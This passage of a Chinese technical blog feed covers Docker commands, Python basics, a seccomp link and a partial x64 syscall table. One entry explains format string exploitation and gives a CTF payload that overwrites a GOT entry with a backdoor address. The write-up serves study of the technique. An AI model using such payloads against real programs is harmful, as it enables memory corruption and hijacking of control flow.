class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;CONTAINER ID&gt;</span><br></pre></td></tr></table></figure><p>3.删除容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;CONTAINER ID&gt;</span><br></pre></td></tr></table></figure><p>4.删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;id|name&gt;</span><br></pre></td></tr></table></figure><h3 id="docker启动"><a href="#docker启动" class="headerlink" title="docker启动"></a>docker启动</h3><p>docker images中已经存在其镜像，对其启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run my/python:v1 cal <span class="comment">##my/python:v1为镜像名和标签</span></span><br></pre></td></tr></table></figure><p>开始容器运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start <span class="variable">$CONTAINER_ID</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;正常的docker安装&quot;&gt;&lt;a href=&quot;#正常的docker安装&quot; class=&quot;headerlink&quot; title=&quot;正常的docker安装&quot;&gt;&lt;/a&gt;正常的docker安装&lt;/h3&gt;&lt;p&gt;由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>格式化字符串解析</title>
    <link href="http://yoursite.com/2020/03/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2020/03/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90/</id>
    <published>2020-03-10T11:08:37.000Z</published>
    <updated>2020-04-04T10:23:12.710Z</updated>
    
    <content type="html"><![CDATA[<p>通常来说，最常见的是printf，那么我也就根据printf来解析。</p><p>首先来看该函数的调用格式：</p><p>printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)</p><p>很多的时候，问题其实出现在参量表，因为在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><p>​    当前字符不是 %，直接输出到相应标准输出。</p><p>​    当前字符是 %， 继续读取下一个字符</p><p>​        如果没有字符，报错</p><p>​        如果下一个字符是 %, 输出 %</p><p>​        否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>利用%n$p来获取栈中的数据，利用%n$s获取栈变量对应的字符串</p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>利用addr%n$s。</p><p>函数会先将addr存入栈中，然后遇到%n$s对栈中存放addr的地址内容进行解析，因为%s是将对应的栈中变量视为字符串变量，输出其数值对应的地址处的字符串。</p><p>所以addr%n$s的运作原理:</p><p>1.addr入栈</p><p>2.%n$s找到栈中第n个参数，也就是addr，对其所指向的地址处的内容进行输出。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>也和上面一样，addr%k$n</p><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>printf(“[addr]%Dd %N$n”)这种格式输出addr就占4个字节，执行覆盖时最小值是4，可不可以小于4？</p><p>那么我们就可以将addr放在后面，这是可以的。</p><p>此时printf变为printf(“xx%k$n[**] [addr]”) 其中的xx, * *可以为任意的字符。</p><p>xx赋值几就几个字符，例如打印2就xx%N$n，由于又需要按字节对齐（否则程序会崩溃）那么我们就需要在$n后面补齐两个字符。</p><p>这个时候，xx%N成为了第k个参数，$nxx成为了第k+1个参数，所以我们此时对于printf的利用中N就需要变成N+2</p><p>注：其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><h5 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h5><p>一个标准的覆盖内存例子。</p><p>格式化字符串漏洞，更改<code>__stack_chk_fail</code>的got表为后门函数地址。</p><p>payload=’%64c%9$hn%1510c%10$hn’+p64(0x601018+2)+p64(0x601018)</p><p>%64c%9$hn此处是以两个字节为单位，写入64个</p><p>%1510c%10$hn这里写入的可不是1510，而是需要加上前面%64c%9$hn写入的64个字节。</p><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>先对Printf作一点补充:</p><p>printf (“%n”,a):当遇到%n时，程序会检查已经输入了多少字符串，然后将其写入到a中。可以通过这一点来改写栈中内存。</p><p>%n写入的内存最大为4字节。</p><p>%hn写入的内存最大为2字节。</p><p>%hhn写入的内存最大为1字节（用于将大字节拆开写）。</p><p>%xd依然会被算入这个空间。</p><p>利用fmtstr！</p><p>fmtstr_payload(offset, {address: value})</p><p>第一个参数 offset 用 autofmt.offset 算好的即可。 </p><p>然后，我们需要声明 {address: value} 来覆盖address的内容成对应的value。我们还可以同时改写多个地址：</p><p>{address1:value1,address2:value2,…,address:valueN}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通常来说，最常见的是printf，那么我也就根据printf来解析。&lt;/p&gt;
&lt;p&gt;首先来看该函数的调用格式：&lt;/p&gt;
&lt;p&gt;printf(“&amp;lt;格式化字符串&amp;gt;”, &amp;lt;参量表&amp;gt;)&lt;/p&gt;
&lt;p&gt;很多的时候，问题其实出现在参量表，因为在进入 printf
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python的初学时光</title>
    <link href="http://yoursite.com/2020/02/24/python%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89/"/>
    <id>http://yoursite.com/2020/02/24/python%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89/</id>
    <published>2020-02-24T10:24:07.000Z</published>
    <updated>2020-04-16T06:11:49.998Z</updated>
    
    <content type="html"><![CDATA[<h4 id="python的一些小点记录"><a href="#python的一些小点记录" class="headerlink" title="python的一些小点记录"></a>python的一些小点记录</h4><h5 id="在一行的末尾作为跨行字符串"><a href="#在一行的末尾作为跨行字符串" class="headerlink" title="\在一行的末尾作为跨行字符串"></a>\在一行的末尾作为跨行字符串</h5><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"a\n</span></span><br></pre></td></tr></table></figure><p>此时你想按回车进行下一行输入，就会发现</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224182743559.png" alt="image-20200224182743559"></p><img src="/2020/02/24/python的初学时光/image-20200224182743559.png"><p>是的，不允许了。这时候就可以在\n后再加上\</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224183022740.png" alt="image-20200224183022740"></p><img src="/2020/02/24/python的初学时光/image-20200224183022740.png"><p>但是呢，也可以利用另外一种写法—-长字符串(triple quoted)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'''a</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa'''</span>)</span><br></pre></td></tr></table></figure><p>这也是完全允许的！</p><h5 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a>random模块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = random.getstate() //获取seed情况</span><br><span class="line">random.getstate(x) //这样就能将seed情况还原为以前记录的情况</span><br></pre></td></tr></table></figure><h5 id="decimal模块（十进制数）"><a href="#decimal模块（十进制数）" class="headerlink" title="decimal模块（十进制数）"></a>decimal模块（十进制数）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = decimal.Decimal(<span class="string">'0.1'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = decimal.Decimal(<span class="string">'0.2'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a+b)</span><br><span class="line"><span class="number">0.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = decimal.Decimal(<span class="string">'0.3'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b == c</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h5 id="列表的插入"><a href="#列表的插入" class="headerlink" title="列表的插入"></a>列表的插入</h5><p>.append()</p><p>允许往列表末尾插入一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.append(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>.extend()</p><p>允许往列表末尾插入任意个元素</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.extend([<span class="string">'竹林'</span>,<span class="string">'我去'</span>])</span><br></pre></td></tr></table></figure><p>.insert()</p><p>允许往列表任意位置插入一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.insert(<span class="number">0</span>,<span class="string">'xx'</span>)</span><br></pre></td></tr></table></figure><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>filter(function or None, iterable)</p><p>filter()会自动将为Flase的元素过滤，输出方法为True的元素</p><p>第一个参数可以是一个函数也可以是一个None。</p><p>当第一个参数是一个函数时，我们可以人为定义这个函数当作一个过滤规则，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x%<span class="number">2</span></span><br><span class="line"></span><br><span class="line">temp = range(<span class="number">10</span>)  //<span class="number">0</span><span class="number">-9</span></span><br><span class="line">show = filter(odd,temp)</span><br><span class="line">list(show)</span><br><span class="line">[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(filter(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,temp))</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>当然，还有一种类似的函数，map()。但是map不是过滤器，而且是遍历的，输出的是值。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x:<span class="keyword">not</span>(x%<span class="number">3</span>),range(<span class="number">100</span>)))</span><br><span class="line">[<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure><p>注：map()后面是可以接受多个序列作为参数的</p><p>将字符串转为二进制输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>,<span class="string">''</span>)<span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br></pre></td></tr></table></figure><p>在字符串中插入字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)//因为python中str是不可变的变量，所以需要list辅助</span><br><span class="line">lista.insert(<span class="number">1</span>,<span class="string">','</span>)</span><br><span class="line">a = <span class="string">''</span>.join(lista)</span><br></pre></td></tr></table></figure><p>在字符串中删去你不要的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">'a'</span>:</span><br><span class="line">c=c+[i]</span><br><span class="line"></span><br><span class="line">a=<span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><p>用{:}表示字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict1 =&#123;&#125;</span><br></pre></td></tr></table></figure><p>字典存在key和values相对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict1&#123;key:values&#125;</span><br></pre></td></tr></table></figure><p>keys()</p><p>打印所有的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1 = dict1.fromkeys(range(<span class="number">32</span>),<span class="string">'赞'</span>)</span><br><span class="line">dict1.keys()</span><br><span class="line">dict_keys([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>])</span><br></pre></td></tr></table></figure><p>相对应的values()</p><p>打印所有的values</p><p>items()</p><p>用元组的形式将每一个都打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> eachItem <span class="keyword">in</span> dict1.items():</span><br><span class="line">print(eachItem)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">0</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">20</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">21</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">22</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">23</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">24</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">25</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">26</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">27</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">28</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">29</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">30</span>, <span class="string">'赞'</span>)</span><br><span class="line">(<span class="number">31</span>, <span class="string">'赞'</span>)</span><br></pre></td></tr></table></figure><p>get()</p><p>利用get()方法来查找字典中的元素，如果不存在于字典中，其不会报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dict1.get(<span class="number">32</span>))</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>clear()</p><p>清空字典</p><p>copy()</p><p>浅拷贝</p><h5 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h5><p>用[]表示集合，注意与上面字典的区分。集合特征:唯一，无序，不能索引</p><p>frozenset() 固定集合，不允许添加删除</p><h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200330224505185.png" alt="image-20200330224505185"></p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200330225459775.png" alt="image-20200330225459775"></p><h5 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h5><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200416130857601.png" alt="image-20200416130857601"></p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200416130921972.png" alt="image-20200416130921972"></p><h5 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">[代码块]</span><br><span class="line"><span class="keyword">except</span> [异常名字] <span class="keyword">as</span> reason:</span><br><span class="line">[对上面<span class="keyword">try</span>中出现的异常进行处理]</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">[不管怎么样都会执行的]</span><br></pre></td></tr></table></figure><p>如果，想异常报错后，重复执行try</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">[]</span><br><span class="line"><span class="keyword">break</span> <span class="comment">#注意这里</span></span><br><span class="line"><span class="keyword">except</span> [] <span class="keyword">as</span> reason:</span><br><span class="line">[]</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;python的一些小点记录&quot;&gt;&lt;a href=&quot;#python的一些小点记录&quot; class=&quot;headerlink&quot; title=&quot;python的一些小点记录&quot;&gt;&lt;/a&gt;python的一些小点记录&lt;/h4&gt;&lt;h5 id=&quot;在一行的末尾作为跨行字符串&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>seccomp学习笔记</title>
    <link href="http://yoursite.com/2019/12/02/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/12/02/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-12-02T14:08:17.000Z</published>
    <updated>2019-12-02T14:09:04.381Z</updated>
    
    <content type="html"><![CDATA[<p>直接贴上V爷爷的地址</p><p><a href="https://veritas501.space/2018/05/05/seccomp学习笔记/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;直接贴上V爷爷的地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://veritas501.space/2018/05/05/seccomp学习笔记/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://veritas501.space/2018
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux系统调用表(system call table)</title>
    <link href="http://yoursite.com/2019/11/18/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8-system-call-table/"/>
    <id>http://yoursite.com/2019/11/18/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8-system-call-table/</id>
    <published>2019-11-18T12:30:15.000Z</published>
    <updated>2019-11-18T12:39:52.518Z</updated>
    
    <content type="html"><![CDATA[<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><table><thead><tr><th align="left">%rax</th><th align="left">System call</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%r10</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">4</td><td align="left">sys_stat</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">5</td><td align="left">sys_fstat</td><td align="left">unsigned int fd</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">6</td><td align="left">sys_lstat</td><td align="left">fconst char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">7</td><td align="left">sys_poll</td><td align="left">struct poll_fd *ufds</td><td align="left">unsigned int nfds</td><td align="left">long timeout_msecs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">sys_lseek</td><td align="left">unsigned int fd</td><td align="left">off_t offset</td><td align="left">unsigned int origin</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">9</td><td align="left">sys_mmap</td><td align="left">unsigned long addr</td><td align="left">unsigned long len</td><td align="left">unsigned long prot</td><td align="left">unsigned long flags</td><td align="left">unsigned long fd</td><td align="left">unsigned long off</td></tr><tr><td align="left">10</td><td align="left">sys_mprotect</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned long prot</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">11</td><td align="left">sys_munmap</td><td align="left">unsigned long addr</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">12</td><td align="left">sys_brk</td><td align="left">unsigned long brk</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">13</td><td align="left">sys_rt_sigaction</td><td align="left">int sig</td><td align="left">const struct sigaction *act</td><td align="left">struct sigaction *oact</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">14</td><td align="left">sys_rt_sigprocmask</td><td align="left">int how</td><td align="left">sigset_t *nset</td><td align="left">sigset_t *oset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">15</td><td align="left">sys_rt_sigreturn</td><td align="left">unsigned long __unused</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">16</td><td align="left">sys_ioctl</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">17</td><td align="left">sys_pread64</td><td align="left">unsigned long fd</td><td 